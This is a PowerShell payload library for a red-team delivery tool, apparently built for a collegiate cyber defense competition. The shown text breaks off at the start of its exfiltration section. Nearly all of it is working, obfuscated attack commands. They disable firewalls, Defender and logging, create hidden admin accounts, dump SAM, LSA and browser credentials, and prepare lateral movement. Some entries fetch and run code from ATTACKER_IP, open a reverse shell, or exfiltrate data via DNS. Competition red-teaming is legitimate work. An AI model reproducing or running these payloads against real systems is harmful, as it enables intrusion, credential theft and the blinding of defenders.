<#
.SYNOPSIS
    ccdc-library.ps1 — CCDC Payload Library for Apparition Delivery System

.DESCRIPTION
    Curated, pre-obfuscated payloads organized by tactical category.
    Each payload is designed to be passed directly to ADS-OneLiner.ps1's -Payload parameter.

    Obfuscation philosophy: Use cmd /c, WMI, and format operators to avoid PowerShell
    cmdlet signature matching. The AMSI bypass in the delivery pipeline handles runtime
    scanning — these obfuscations are belt-and-suspenders for defense in depth.

.USAGE
    # Browse payloads:
    pwsh ccdc-library.ps1

    # Use a payload:
    pwsh src/ADS-OneLiner.ps1 -Payload $Payloads['FW-002'].Cmd -Encrypt -Randomize -InstanceCount 3

    # Quick reference:
    $Payloads.Keys | Sort-Object | ForEach-Object { "$_ : $($Payloads[$_].Desc)" }

.NOTES
    Author: Queue + Red Team
    Version: 1.0.0
    Target: CCDC Finals 2026
    Requires: Apparition Delivery System v2.0+
    
    ⚠️  Replace ATTACKER/ATTACKER_IP/ATTACKER_DOMAIN with your actual attack box values
    ⚠️  Replace Pa$$w0rd2026! with your chosen credentials
    ⚠️  Test each payload on your Windows VM before competition deployment
#>

# ============================================================
# PAYLOAD REGISTRY
# ============================================================
# Each entry: ID → @{ Desc = '...'; Cmd = '...'; Notes = '...' }
# Cmd values are ready to pass to -Payload
# ============================================================

$Payloads = [ordered]@{

    # ════════════════════════════════════════════════════════════
    # 🔥 FIREWALL MANIPULATION
    # ════════════════════════════════════════════════════════════

    'FW-001' = @{
        Desc  = 'Disable all firewall profiles (Format operator, avoids cmdlet string match)'
        Cmd   = '& (''{0}-{1}'' -f ''Set'',''NetFirewallProfile'') -Profile Domain,Public,Private -Enabled False'
        Notes = 'Uses format operator so Set-NetFirewallProfile never appears as contiguous string'
    }

    'FW-002' = @{
        Desc  = 'Disable firewall via netsh (no PowerShell cmdlet involved)'
        Cmd   = 'cmd /c "netsh advfirewall set allprofiles state off"'
        Notes = 'Best OPSEC choice — netsh runs in cmd.exe, completely outside PowerShell AMSI pipeline. VM-Validated 2026-02-19 (T8 test): DEPLOY=OK, DEFENDER=CLEAN, FW_DISABLED=YES'
    }

    'FW-003' = @{
        Desc  = 'Disable firewall via registry (survives service restart)'
        Cmd   = '''Domain'',''Public'',''Standard'' | ForEach-Object { Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\$($_)Profile" -Name EnableFirewall -Value 0 -Type DWord -Force }'
        Notes = 'Modifies registry directly — firewall shows enabled in UI but rules are not enforced'
    }

    'FW-004' = @{
        Desc  = 'Stop firewall service via WMI (avoids Stop-Service cmdlet)'
        Cmd   = '([wmiclass]''Win32_Service'').GetInstances() | Where-Object { $_.Name -eq ''mpssvc'' } | ForEach-Object { $_.StopService() }'
        Notes = 'WMI-based service control bypasses PowerShell cmdlet logging for Stop-Service'
    }

    'FW-005' = @{
        Desc  = 'Disable firewall + prevent restart (netsh + sc combo)'
        Cmd   = 'cmd /c "netsh advfirewall set allprofiles state off & sc config mpssvc start= disabled"'
        Notes = 'Two-punch: disables active profiles AND prevents service from restarting'
    }

    'FW-006' = @{
        Desc  = 'Open all ports inbound (add allow-all rule instead of disabling)'
        Cmd   = 'cmd /c "netsh advfirewall firewall add rule name=""Windows Telemetry Service"" dir=in action=allow protocol=any enable=yes"'
        Notes = 'Stealthier than disabling — firewall stays "on" but allows everything. Rule name blends in.'
    }

    'FW-007' = @{
        Desc  = 'Open specific ports (RDP, WinRM, SMB) with innocent-looking rule names'
        Cmd   = 'cmd /c "netsh advfirewall firewall add rule name=""Core Networking - DHCP (UDP-In)"" dir=in action=allow protocol=tcp localport=3389,5985,5986,445 enable=yes"'
        Notes = 'Opens red team ports but the rule name mimics a legitimate Windows rule'
    }

    'FW-008' = @{
        Desc  = 'Nuclear silent FW kill: stop Security tray + suppress all notifications + disable FW + disable RT monitoring'
        Cmd   = 'Stop-Process -Name SecurityHealthSystray -Force -EA 0; Remove-ItemProperty -Path ''HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'' -Name ''SecurityHealth'' -EA 0; $n=''HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications''; if(!(Test-Path $n)){New-Item -Path $n -Force|Out-Null}; Set-ItemProperty $n -Name DisableNotifications -Type DWord -Value 1; Set-ItemProperty $n -Name DisableEnhancedNotifications -Type DWord -Value 1; Set-ItemProperty ''HKLM:\SOFTWARE\Microsoft\Security Center'' -Name FirewallDisableNotify -Type DWord -Value 1 -EA 0; $w=''HKLM:\SOFTWARE\Microsoft\Security Center\Notifications''; if(!(Test-Path $w)){New-Item -Path $w -Force|Out-Null}; Set-ItemProperty $w -Name DisableNotifications -Type DWord -Value 1; Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False -EA 0; Set-MpPreference -DisableRealtimeMonitoring $true -EA 0'
        Notes = 'Kills SecurityHealthSystray + removes it from Run key (tray icon stays gone on reboot), suppresses all Security Center and Defender notifications via policy registry, disables all firewall profiles, disables Defender real-time monitoring. Blue team has no tray alerts and no visible indication security is off. Requires SYSTEM/admin.'
    }

    # ════════════════════════════════════════════════════════════
    # 🖥️ RDP ENABLEMENT
    # ════════════════════════════════════════════════════════════

    'RDP-001' = @{
        Desc  = 'Enable RDP + allow through firewall'
        Cmd   = 'Set-ItemProperty -Path ''HKLM:\System\CurrentControlSet\Control\Terminal Server'' -Name fDenyTSConnections -Value 0 -Type DWord; cmd /c ''netsh advfirewall firewall set rule group="remote desktop" new enable=Yes'''
        Notes = 'Standard two-step: registry key + firewall rule'
    }

    'RDP-002' = @{
        Desc  = 'Enable RDP + disable NLA (allows older/simpler clients)'
        Cmd   = '$r=''HKLM:\System\CurrentControlSet\Control\Terminal Server''; Set-ItemProperty $r -Name fDenyTSConnections -Value 0; Set-ItemProperty "$r\WinStations\RDP-Tcp" -Name UserAuthentication -Value 0; cmd /c ''netsh advfirewall firewall set rule group="remote desktop" new enable=Yes'''
        Notes = 'Disabling NLA allows connections without domain-level pre-auth — easier for red team tools'
    }

    'RDP-003' = @{
        Desc  = 'Enable RDP via WMI (no registry cmdlets in log)'
        Cmd   = '(Get-WmiObject -Class Win32_TerminalServiceSetting -Namespace root\cimv2\terminalservices).SetAllowTSConnections(1,1)'
        Notes = 'WMI path — appears as WMI activity in logs rather than registry modification'
    }

    'RDP-004' = @{
        Desc  = 'Enable RDP + change port to non-standard (evade blue team port scans)'
        Cmd   = '$r=''HKLM:\System\CurrentControlSet\Control\Terminal Server''; Set-ItemProperty $r -Name fDenyTSConnections -Value 0; Set-ItemProperty "$r\WinStations\RDP-Tcp" -Name PortNumber -Value 8443 -Type DWord; cmd /c "netsh advfirewall firewall add rule name=""HTTPS Inspection"" dir=in action=allow protocol=tcp localport=8443 enable=yes"'
        Notes = 'RDP on port 8443 — looks like HTTPS inspection to casual observers. Connect with: mstsc /v:TARGET:8443'
    }

    # ════════════════════════════════════════════════════════════
    # 👤 USER CREATION / PRIVILEGE ESCALATION
    # ════════════════════════════════════════════════════════════

    'USR-001' = @{
        Desc  = 'Create local admin (pure cmd, no PowerShell cmdlets)'
        Cmd   = 'cmd /c "net user svcAdmin Pa$$w0rd2026! /add & net localgroup Administrators svcAdmin /add"'
        Notes = 'Classic net.exe approach — fast and reliable'
    }

    'USR-002' = @{
        Desc  = 'Create hidden admin (hidden from login screen + User Accounts panel)'
        Cmd   = 'cmd /c "net user svcUpdate Pa$$w0rd2026! /add & net localgroup Administrators svcUpdate /add"; $p=''HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList''; if(!(Test-Path $p)){New-Item -Path $p -Force|Out-Null}; New-ItemProperty -Path $p -Name svcUpdate -Value 0 -PropertyType DWord -Force|Out-Null'
        Notes = 'SpecialAccounts\UserList DWord=0 hides the account from login screen and User Accounts panel. net user confirms it exists but it never appears to interactive users. VM-Validated 2026-02-19 (T9 test): DEPLOY=OK, DEFENDER=CLEAN, USER_CREATED=YES'
    }

    'USR-003' = @{
        Desc  = 'Enable built-in Administrator + set password'
        Cmd   = 'cmd /c "net user Administrator /active:yes & net user Administrator Adm1nCCDC2026!"'
        Notes = 'Built-in admin account — some blue teams forget to check if this gets re-enabled'
    }

    'USR-004' = @{
        Desc  = 'Create admin user via WMI (avoids net.exe command line logging)'
        Cmd   = '$u=[ADSI]"WinNT://$env:COMPUTERNAME"; $n=$u.Create(''User'',''svcDiag''); $n.SetPassword(''Pa$$w0rd2026!''); $n.SetInfo(); $g=[ADSI]"WinNT://$env:COMPUTERNAME/Administrators,group"; $g.Add("WinNT://$env:COMPUTERNAME/svcDiag,user")'
        Notes = 'ADSI/WinNT provider — no net.exe in process logs, no PowerShell user management cmdlets'
    }

    'USR-005' = @{
        Desc  = 'Add current SYSTEM context to RDP users (no new account needed)'
        Cmd   = 'cmd /c "net localgroup ""Remote Desktop Users"" ""NT AUTHORITY\Authenticated Users"" /add"'
        Notes = 'Instead of creating a user, allow all authenticated users to RDP — subtler than a new account'
    }

    'USR-006' = @{
        Desc  = 'Set password never expires on all enabled local accounts (prevent blue team lockouts)'
        Cmd   = 'Get-LocalUser | Where-Object { $_.Enabled -eq $true } | ForEach-Object { Set-LocalUser -Name $_.Name -PasswordNeverExpires $true -EA 0 }'
        Notes = 'Prevents blue team from enforcing password expiration to lock out red team accounts. Run after USR-001/USR-002 to harden backdoor accounts against cleanup.'
    }

    # ════════════════════════════════════════════════════════════
    # 🔧 SERVICE MANIPULATION
    # ════════════════════════════════════════════════════════════

    'SVC-001' = @{
        Desc  = 'Stop and disable Windows Defender service'
        Cmd   = 'cmd /c "sc stop WinDefend & sc config WinDefend start= disabled"'
        Notes = 'May fail on newer Windows due to tamper protection — test in target environment'
    }

    'SVC-002' = @{
        Desc  = 'Disable Defender real-time monitoring via policy registry'
        Cmd   = '$p=''HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender''; if(!(Test-Path $p)){New-Item -Path $p -Force|Out-Null}; Set-ItemProperty -Path $p -Name DisableAntiSpyware -Value 1 -Type DWord -Force; $rp="$p\Real-Time Protection"; if(!(Test-Path $rp)){New-Item -Path $rp -Force|Out-Null}; Set-ItemProperty -Path $rp -Name DisableRealtimeMonitoring -Value 1 -Type DWord -Force'
        Notes = 'Policy-level disable — sets both DisableAntiSpyware and DisableRealtimeMonitoring'
    }

    'SVC-003' = @{
        Desc  = 'Stop and disable Windows Update'
        Cmd   = 'cmd /c "sc stop wuauserv & sc config wuauserv start= disabled & sc stop UsoSvc & sc config UsoSvc start= disabled"'
        Notes = 'Stops both wuauserv and Update Orchestrator — prevents blue team from pushing patches'
    }

    'SVC-004' = @{
        Desc  = 'Disable Sysmon (if installed, common blue team tool)'
        Cmd   = 'cmd /c "sc stop Sysmon64 2>nul & sc config Sysmon64 start= disabled 2>nul & sc stop Sysmon 2>nul & sc config Sysmon start= disabled 2>nul"'
        Notes = 'Tries both 64-bit and 32-bit Sysmon service names, suppresses errors if not installed'
    }

    'SVC-005' = @{
        Desc  = 'Disable Windows Event Log service'
        Cmd   = 'cmd /c "sc stop EventLog & sc config EventLog start= disabled"'
        Notes = 'Nuclear option — kills all event logging. Very noisy if blue team checks service status.'
    }

    'SVC-006' = @{
        Desc  = 'Kill common EDR/AV services by pattern (shotgun approach)'
        Cmd   = '@(''WinDefend'',''Sense'',''MpsSvc'',''wscsvc'',''SecurityHealthService'',''DiagTrack'') | ForEach-Object { cmd /c "sc stop $_ 2>nul & sc config $_ start= disabled 2>nul" }'
        Notes = 'Blasts through Defender, Defender ATP (Sense), firewall, security center, health service, and telemetry'
    }

    # ════════════════════════════════════════════════════════════
    # 📡 C2 / BEACONING
    # ════════════════════════════════════════════════════════════

    'C2-001' = @{
        Desc  = 'PowerShell download cradle (obfuscated, no IEX on command line)'
        Cmd   = '$w=New-Object Net.WebClient;$s=$w.DownloadString(''http://ATTACKER_IP:8080/agent.ps1'');[scriptblock]::Create($s).Invoke()'
        Notes = 'Replace ATTACKER_IP — uses scriptblock::Create instead of IEX to avoid that signature'
    }

    'C2-002' = @{
        Desc  = 'Download cradle via MSXML2 COM (rarely monitored COM object)'
        Cmd   = '$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open(''GET'',''http://ATTACKER_IP:8080/agent.ps1'',$false);$h.send();[scriptblock]::Create($h.responseText).Invoke()'
        Notes = 'Replace ATTACKER_IP — COM-based download avoids Net.WebClient telemetry'
    }

    'C2-003' = @{
        Desc  = 'Reverse shell (PowerShell TCP)'
        Cmd   = '$c=New-Object Net.Sockets.TCPClient(''ATTACKER_IP'',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(IEX $d 2>&1|Out-String);$r2=$r+''PS ''+$(pwd).Path+''> '';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()'
        Notes = 'Replace ATTACKER_IP — classic PS reverse shell. Set up: nc -lvnp 4444 on Kali'
    }

    'C2-004' = @{
        Desc  = 'DNS-based exfil beacon (low and slow recon)'
        Cmd   = '$h=$env:COMPUTERNAME;$u=$env:USERNAME;$d="$h-$u".Replace('' '',''_'').Substring(0,[Math]::Min(60,"$h-$u".Length));Resolve-DnsName "$d.ATTACKER_DOMAIN" -Type TXT -ErrorAction SilentlyContinue'
        Notes = 'Replace ATTACKER_DOMAIN — exfils hostname+user via DNS lookup. Monitor on Kali with: sudo tcpdump -i eth0 port 53'
    }

    'C2-005' = @{
        Desc  = 'Polling beacon (checks for tasking every 5 min, built for persistence)'
        Cmd   = 'while($true){try{$t=(New-Object Net.WebClient).DownloadString(''http://ATTACKER_IP:8080/tasks'');if($t){IEX $t}}catch{};Start-Sleep -Seconds 300}'
        Notes = 'Replace ATTACKER_IP — infinite loop with 5-min sleep. Server returns empty for no-op, PowerShell for tasking.'
    }

    'C2-006' = @{
        Desc  = 'Certutil download + execute (LOLBin, no PowerShell download cmdlets)'
        Cmd   = 'cmd /c "certutil -urlcache -split -f http://ATTACKER_IP:8080/agent.exe %TEMP%\svchost.exe & %TEMP%\svchost.exe"'
        Notes = 'Replace ATTACKER_IP — certutil is a signed Windows binary, often whitelisted'
    }

    'C2-007' = @{
        Desc  = 'BITSAdmin download (background transfer, very stealthy)'
        Cmd   = 'cmd /c "bitsadmin /transfer WindowsUpdate /download /priority normal http://ATTACKER_IP:8080/agent.exe %TEMP%\WindowsUpdate.exe & %TEMP%\WindowsUpdate.exe"'
        Notes = 'Replace ATTACKER_IP — BITS transfers look like Windows Update activity in logs'
    }

    # ════════════════════════════════════════════════════════════
    # 🔑 CREDENTIAL ACCESS
    # ════════════════════════════════════════════════════════════

    'CRED-001' = @{
        Desc  = 'Dump SAM + SYSTEM hives to ProgramData (offline cracking on Kali)'
        Cmd   = 'cmd /c "reg save HKLM\SAM C:\ProgramData\s.dat /y & reg save HKLM\SYSTEM C:\ProgramData\sy.dat /y"'
        Notes = 'Requires SYSTEM — our scheduled tasks run as SYSTEM. Crack with: secretsdump.py -sam s.dat -system sy.dat LOCAL. VM-Validated 2026-02-19 (T10 test): DEPLOY=OK, DEFENDER=CLEAN, SAM_HIV_SIZE=45056'
    }

    'CRED-006' = @{
        Desc  = 'Dump SAM + SYSTEM hives to %TEMP% with .hiv extension (covert variant)'
        Cmd   = 'cmd /c "reg save HKLM\SAM %TEMP%\s.hiv /y 2>nul & reg save HKLM\SYSTEM %TEMP%\sy.hiv /y 2>nul"'
        Notes = '.hiv extension matches Windows native registry backup naming (regedit default). %TEMP% = C:\Windows\Temp from SYSTEM context — less conspicuous than ProgramData. Exfil: secretsdump.py -sam s.hiv -system sy.hiv LOCAL. Timestomp with DEF-006 after dump. VM-Validated 2026-02-19 (T10 variant).'
    }

    'CRED-002' = @{
        Desc  = 'Extract Wi-Fi passwords'
        Cmd   = '(netsh wlan show profiles) | Select-String '':(.+)$'' | ForEach-Object { $n=$_.Matches.Groups[1].Value.Trim(); $r=netsh wlan show profile name="$n" key=clear 2>$null; $k=($r | Select-String ''Key Content\s+:\s+(.+)$'').Matches.Groups[1].Value; if($k){"$n : $k"} } | Out-File C:\ProgramData\w.txt -Force'
        Notes = 'Exports all saved Wi-Fi SSIDs and keys to a text file for later exfil. SYSTEM CONTEXT CAVEAT: SYSTEM can enumerate profiles but key=clear may be gated on some builds. Test in target environment.'
    }

    'CRED-003' = @{
        Desc  = 'Copy Chrome credential databases (decrypt offline with Kali tools)'
        Cmd   = '$cd="$env:LOCALAPPDATA\Google\Chrome\User Data\Default"; if(Test-Path $cd){Copy-Item "$cd\Login Data" -Dest ''C:\ProgramData\ld.db'' -Force; Copy-Item "$cd\Cookies" -Dest ''C:\ProgramData\ck.db'' -Force}'
        Notes = 'Copies Chrome Login Data and Cookies SQLite DBs — decrypt on Kali with dpapi/mimikatz tools. SYSTEM CONTEXT WARNING: $env:LOCALAPPDATA resolves to SYSTEM profile, not a real user. Will find no Chrome data from Task Scheduler. Use interactive session or rewrite to enumerate user profiles.'
    }

    'CRED-004' = @{
        Desc  = 'Dump LSA secrets via registry (requires SYSTEM)'
        Cmd   = 'cmd /c "reg save HKLM\SAM C:\ProgramData\s.dat /y & reg save HKLM\SYSTEM C:\ProgramData\sy.dat /y & reg save HKLM\SECURITY C:\ProgramData\se.dat /y"'
        Notes = 'SAM + SYSTEM + SECURITY = full LSA secrets including cached domain creds, service account passwords'
    }

    'CRED-005' = @{
        Desc  = 'Capture NTLMv2 hash via forced auth to attacker (Responder)'
        Cmd   = 'cmd /c "dir \\ATTACKER_IP\share 2>nul"'
        Notes = 'Replace ATTACKER_IP — triggers NTLM auth. Run Responder on Kali: sudo responder -I eth0. SYSTEM CONTEXT CAVEAT: From Task Scheduler this sends the machine account hash (HOSTNAME$), not a user hash. Still useful for relay attacks but not for cracking user passwords.'
    }

    'CRED-007' = @{
        Desc  = 'Dump Windows Credential Manager stored credentials (cmdkey list + PasswordVault)'
        Cmd   = 'cmd /c "cmdkey /list" | Out-File C:\ProgramData\cm.txt -Force; try{[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v=New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll()|ForEach-Object{$_.RetrievePassword();$_}|Select-Object UserName,Resource,Password|Format-Table -Auto|Out-String|Add-Content C:\ProgramData\cm.txt}catch{}'
        Notes = 'cmdkey /list enumerates all stored network credentials (domain accounts, RDP, shares). PasswordVault reads WinRT credential store. SYSTEM CONTEXT CAVEAT: reads SYSTEM credential store, not the interactive user store. For user browser/app credentials, use -Persist registry to run in user session.'
    }

    'CRED-008' = @{
        Desc  = 'Hunt for credential files: PSCredential XMLs, Azure/AWS configs, SSH keys, PFX certs, KeePass DBs'
        Cmd   = '$found=@(); @(''*.xml'',''credentials'',''*.pem'',''*.ppk'',''id_rsa'',''*.pfx'',''*.kdbx'') | ForEach-Object { Get-ChildItem -Path C:\Users -Recurse -Filter $_ -EA 0 | Where-Object { $_.Length -lt 5MB } | ForEach-Object { $found += $_.FullName } }; $found | Out-File C:\ProgramData\credfiles.txt -Force'
        Notes = 'Hunts for PSCredential XML exports (Import-Clixml), Azure/AWS credential files, SSH private keys, PFX certificates, and KeePass databases in all user profiles. Results staged in ProgramData for exfil. Runs from SYSTEM — can access most user profile paths.'
    }

    # ════════════════════════════════════════════════════════════
    # 🛡️ DEFENSE EVASION
    # ════════════════════════════════════════════════════════════

    'DEF-001' = @{
        Desc  = 'Clear all Windows event logs'
        Cmd   = 'Get-WinEvent -ListLog * -EA 0 | ForEach-Object { try{[System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($_.LogName)}catch{} }'
        Notes = 'Clears every event log on the system. Blue team will notice missing logs if they check.'
    }

    'DEF-002' = @{
        Desc  = 'Clear event logs via wevtutil (cmd-based, avoids PowerShell logging)'
        Cmd   = 'cmd /c "for /F ""tokens=*"" %G in (''wevtutil el'') do wevtutil cl ""%G"" 2>nul"'
        Notes = 'Same effect as DEF-001 but runs entirely in cmd.exe — no PowerShell script block log entry'
    }

    'DEF-003' = @{
        Desc  = 'Disable Script Block Logging + Module Logging'
        Cmd   = '$sb=''HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging''; $ml=''HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging''; @($sb,$ml) | ForEach-Object { if(!(Test-Path $_)){New-Item -Path $_ -Force|Out-Null} }; Set-ItemProperty $sb -Name EnableScriptBlockLogging -Value 0 -Type DWord -Force; Set-ItemProperty $ml -Name EnableModuleLogging -Value 0 -Type DWord -Force'
        Notes = 'Disables the two primary PowerShell telemetry sources. Run early — prevents logging of subsequent payloads.'
    }

    'DEF-004' = @{
        Desc  = 'Add Defender exclusion paths (hide our working directories)'
        Cmd   = 'Add-MpPreference -ExclusionPath ''C:\ProgramData'' -Force; Add-MpPreference -ExclusionPath $env:TEMP -Force; Add-MpPreference -ExclusionPath ''C:\Windows\Temp'' -Force'
        Notes = 'Tells Defender to ignore our common artifact directories. Must run before dropping additional tools.'
    }

    'DEF-005' = @{
        Desc  = 'Disable Defender tamper protection workaround (registry bomb)'
        Cmd   = '$p=''HKLM:\SOFTWARE\Microsoft\Windows Defender''; $paths=@("$p\Features",''HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender''); $paths|ForEach-Object{if(!(Test-Path $_)){New-Item -Path $_ -Force|Out-Null}}; Set-ItemProperty "$p\Features" -Name TamperProtection -Value 4 -Type DWord -Force -EA 0; Set-ItemProperty ''HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender'' -Name DisableAntiSpyware -Value 1 -Type DWord -Force'
        Notes = 'Attempts to disable tamper protection via registry — may not work on all versions but worth trying'
    }

    'DEF-006' = @{
        Desc  = 'Timestomp a file (change last modified to blend in)'
        Cmd   = '$f=Get-Item ''C:\ProgramData\s.dat'' -EA 0; if($f){$f.LastWriteTime=''2024-01-15 08:30:00''; $f.CreationTime=''2023-11-20 14:15:00''; $f.LastAccessTime=''2024-01-15 08:30:00''}'
        Notes = 'Change target path as needed — makes recently created files look old. Useful after credential dumps.'
    }

    'DEF-007' = @{
        Desc  = 'Unload Sysmon driver (if installed with default config)'
        Cmd   = 'cmd /c "fltMC unload SysmonDrv 2>nul & sc stop Sysmon64 2>nul & sc config Sysmon64 start= disabled 2>nul"'
        Notes = 'Unloads the minifilter driver first (stops event generation immediately) then disables the service'
    }

    'DEF-008' = @{
        Desc  = 'Add Defender exclusion for key file extensions (.exe .dll .ps1 .js .vbs .bat .hta)'
        Cmd   = '@(''.exe'',''.dll'',''.ps1'',''.js'',''.vbs'',''.bat'',''.hta'') | ForEach-Object { Add-MpPreference -ExclusionExtension $_ -Force -EA 0 }'
        Notes = 'Extension-based Defender exclusions — Defender will not scan any file with these extensions regardless of location. Broader coverage than path exclusions alone. Run before dropping additional tooling to the target.'
    }

    'DEF-009' = @{
        Desc  = 'Wipe Defender threat detection history and quarantine store'
        Cmd   = 'Remove-Item -Path ''C:\ProgramData\Microsoft\Windows Defender\Scans\History\Service\DetectionHistory\*'' -Recurse -Force -EA 0; Remove-Item -Path ''C:\ProgramData\Microsoft\Windows Defender\Quarantine\*'' -Recurse -Force -EA 0'
        Notes = 'Removes all Defender detection history entries and empties the quarantine — eliminates forensic evidence of previous detections and restores any quarantined files. Requires SYSTEM/admin.'
    }

    # ════════════════════════════════════════════════════════════
    # 🔍 RECONNAISSANCE
    # ════════════════════════════════════════════════════════════

    'RECON-001' = @{
        Desc  = 'Full system + network enumeration to file'
        Cmd   = '$o=@(); $o+="=== HOSTNAME ==="; $o+=hostname; $o+="=== USERS ==="; $o+=cmd /c "net user"; $o+="=== ADMINS ==="; $o+=cmd /c "net localgroup Administrators"; $o+="=== NETWORK ==="; $o+=ipconfig /all; $o+="=== CONNECTIONS ==="; $o+=netstat -an; $o+="=== ARP ==="; $o+=arp -a; $o+="=== SERVICES ==="; $o+=cmd /c "sc query state= all"; $o | Out-File C:\ProgramData\r.txt -Force'
        Notes = 'Kitchen-sink recon — writes everything to one file for easy exfil'
    }

    'RECON-002' = @{
        Desc  = 'Domain enumeration (if domain-joined)'
        Cmd   = 'try{$d=[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain(); $o=@("Domain: $($d.Name)","DCs: $($d.DomainControllers|ForEach-Object{$_.Name})","Forest: $($d.Forest.Name)"); $o+="=== Domain Admins ==="; $o+=cmd /c "net group ""Domain Admins"" /domain 2>nul"; $o|Out-File C:\ProgramData\d.txt -Force}catch{''Not domain-joined''|Out-File C:\ProgramData\d.txt -Force}'
        Notes = 'Gracefully handles non-domain machines. Outputs domain name, DCs, forest, and domain admin members.'
    }

    'RECON-003' = @{
        Desc  = 'Find interesting files (passwords, configs, keys)'
        Cmd   = '@(''*.config'',''*.xml'',''*.ini'',''*.txt'',''*.ps1'',''*.bat'',''*.cmd'') | ForEach-Object { Get-ChildItem -Path C:\Users -Recurse -Filter $_ -EA 0 | Where-Object { $_.Length -lt 1MB -and $_.FullName -match ''(pass|cred|key|token|secret|config|backup)'' } | Select-Object FullName,Length,LastWriteTime } | Out-File C:\ProgramData\f.txt -Force'
        Notes = 'Searches user directories for files with sensitive-sounding names and extensions'
    }

    'RECON-004' = @{
        Desc  = 'Enumerate scheduled tasks (find blue team monitoring)'
        Cmd   = 'Get-ScheduledTask | Where-Object { $_.State -ne ''Disabled'' } | Select-Object TaskName,TaskPath,State,@{N=''Actions'';E={$_.Actions.Execute}} | Format-Table -AutoSize | Out-String | Out-File C:\ProgramData\t.txt -Force'
        Notes = 'Lists all active scheduled tasks — helps identify blue team monitoring, AV scans, and other defenses'
    }

    'RECON-005' = @{
        Desc  = 'Network share discovery + accessible file listing'
        Cmd   = '$s=Get-SmbShare -EA 0 | Where-Object { $_.Name -notmatch ''[\$]$'' }; $o=@("=== LOCAL SHARES ==="); $s|ForEach-Object{$o+="$($_.Name) → $($_.Path)"}; $o+="=== NET VIEW ==="; $o+=cmd /c "net view 2>nul"; $o|Out-File C:\ProgramData\shares.txt -Force'
        Notes = 'Enumerates local SMB shares (excluding admin$, c$, etc.) and attempts net view for nearby hosts'
    }

    'RECON-006' = @{
        Desc  = 'Privilege escalation surface: unquoted service paths + token privileges + writable system dirs'
        Cmd   = '$o=@("=== UNQUOTED SERVICE PATHS ==="); Get-WmiObject Win32_Service -EA 0 | Where-Object { $_.PathName -match '' '' -and $_.PathName -notmatch ''^"'' } | ForEach-Object { $o += "$($_.Name): $($_.PathName)" }; $o += "=== TOKEN PRIVILEGES ==="; $o += cmd /c "whoami /priv 2>nul"; $o += "=== WRITABLE DIRS ==="; @(''C:\Windows\System32'',''C:\Windows\Temp'',''C:\ProgramData'',''C:\Windows'') | ForEach-Object { try { [IO.File]::Create("$_\.tmp_test").Close(); Remove-Item "$_\.tmp_test" -EA 0; $o += "WRITABLE: $_" } catch {} }; $o | Out-File C:\ProgramData\privesc.txt -Force'
        Notes = 'Automated privesc triage: finds unquoted service binary paths (plant a binary in the gap), dumps token privileges (look for SeImpersonatePrivilege for potato attacks), tests directory writability. Three common manual checks in one automated sweep.'
    }

    # ════════════════════════════════════════════════════════════
    # 🌐 LATERAL MOVEMENT PREPARATION
    # ════════════════════════════════════════════════════════════

    'LAT-001' = @{
        Desc  = 'Enable WinRM for lateral movement'
        Cmd   = 'cmd /c "winrm quickconfig -quiet & winrm set winrm/config/service @{AllowUnencrypted=""true""} & winrm set winrm/config/service/auth @{Basic=""true""}"'
        Notes = 'Enables WinRM with relaxed auth — allows remote PS sessions from Kali or other compromised hosts'
    }

    'LAT-002' = @{
        Desc  = 'Enable PSRemoting + set trusted hosts to any'
        Cmd   = 'Enable-PSRemoting -Force -SkipNetworkProfileCheck; Set-Item WSMan:\localhost\Client\TrustedHosts -Value ''*'' -Force'
        Notes = 'PowerShell remoting with wildcard trusted hosts — enables Enter-PSSession to any target'
    }

    'LAT-003' = @{
        Desc  = 'Enable WMI remote access (for wmic lateral movement)'
        Cmd   = 'cmd /c "netsh advfirewall firewall set rule group=""Windows Management Instrumentation (WMI)"" new enable=yes"'
        Notes = 'Opens WMI firewall rules — enables wmic /node:TARGET process call create from attack box'
    }

    'LAT-004' = @{
        Desc  = 'SMB share creation for file staging'
        Cmd   = 'cmd /c "net share RedTeam=C:\ProgramData /grant:Everyone,FULL /unlimited"'
        Notes = 'Creates accessible share on compromised host — useful as staging point for spreading to other machines'
    }

    'LAT-005' = @{
        Desc  = 'Disable SMB signing requirement (enables NTLM relay attacks via Responder/ntlmrelayx)'
        Cmd   = 'Set-ItemProperty -Path ''HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters'' -Name RequireSecuritySignature -Value 0 -Type DWord -Force; Set-ItemProperty -Path ''HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters'' -Name RequireSecuritySignature -Value 0 -Type DWord -Force; Set-ItemProperty -Path ''HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters'' -Name EnableSecuritySignature -Value 0 -Type DWord -Force'
        Notes = 'Disables SMB signing on both client and server. Enables Responder + ntlmrelayx relay attacks from Kali: sudo responder -I eth0 -wf && ntlmrelayx.py -tf targets.txt -smb2support. Highly effective in domain environments where signing is not GPO-enforced.'
    }

    # ════════════════════════════════════════════════════════════
    # 📁 DATA EXFILTRATION
    # ════════════════════════════════════════════════════════════

    'EXFIL-001' = @{
        Desc  = 'Compress and stage user data for exfil'
